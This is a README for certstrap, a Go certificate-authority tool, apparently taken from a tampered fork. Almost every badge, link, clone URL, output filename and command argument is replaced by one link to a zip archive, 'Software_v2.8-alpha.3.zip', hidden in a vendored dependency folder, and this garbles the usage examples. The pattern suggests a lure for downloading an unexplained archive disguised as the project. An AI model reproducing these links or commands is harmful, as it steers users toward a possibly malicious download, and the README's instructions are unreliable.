# certstrap
[![build](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip)](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip) [![license](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip)](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip)

A simple certificate manager written in Go, to bootstrap your own certificate authority and public key infrastructure.  Adapted from etcd-ca.

certstrap is a very convenient app if you don't feel like dealing with openssl, its myriad of options or config files.

## Common Uses

certstrap allows you to build your own certificate system:

1. Initialize certificate authorities
2. Create identities and certificate signature requests for hosts
3. Sign and generate certificates

## Certificate architecture

certstrap can init multiple certificate authorities to sign certificates with.  Users can make arbitrarily long certificate chains by using signed hosts to sign later certificate requests, as well.

## Examples

## Getting Started

### Building

certstrap must be built with Go 1.4+. You can build certstrap from source:

```
$ git clone https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
$ cd certstrap
$ ./build
```

This will generate a binary called `./bin/certstrap`
Note that certstrap depends on godep, cli, and terminal (godep should
handle the latter two for you).

### Initialize a new certificate authority:

```
$ ./bin/certstrap init --common-name "CertAuth"
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
```

Note that the `-common-name` flag is required, and will be used to name output files.

Moreover, this will also generate a new keypair for the Certificate Authority,
though you can use a pre-existing private PEM key with the `-key` flag.

If the CN contains spaces, certstrap will change them to underscores in the filename for easier use.  The spaces will be preserved inside the fields of the generated files:

```
$ ./bin/certstrap init --common-name "Cert Auth"
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
```

### Request a certificate, including keypair:

```
$ ./bin/certstrap request-cert --common-name Alice
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
```

certstrap requires at least one of `-common-name`, `-ip`, or `-domain` flags to be set in order to generate a certificate signing request.  The CN for the certificate will be found from these fields.

If your server has mutiple ip addresses or domains, use comma seperated ip/domain list. eg: `./certstrap request-cert -ip $ip1,$ip2 -domain $domain1,$domain2`

If you do not wish to generate a new keypair, you can use a pre-existing private
PEM key with the `-key` flag

### Sign certificate request of host and generate the certificate:

```
$ ./bin/certstrap sign Alice --CA CertAuth
Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip from https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip signed by https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
```

#### PKCS Format:
If you'd like to convert your certificate and key to PKCS12 format, simply run:
```
$ openssl pkcs12 -export -out outputCert.p12 -inkey https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip -in https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip -certfile https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
```
`https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip` and `https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip` make up the leaf private key and certificate pair of your choosing (generated by a `sign` command), with `https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip` being the certificate authority certificate that was used to sign it.  The output PKCS12 file is `outputCert.p12`


### Retrieving Files

Outputted key, request, and certificate files can be found in the depot directory.
By default, this is in `out/`


## Project Details

### Contributing

See [CONTRIBUTING](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip) for details on submitting patches.

### License

certstrap is under the Apache 2.0 license. See the [LICENSE](LICENSE) file for details.
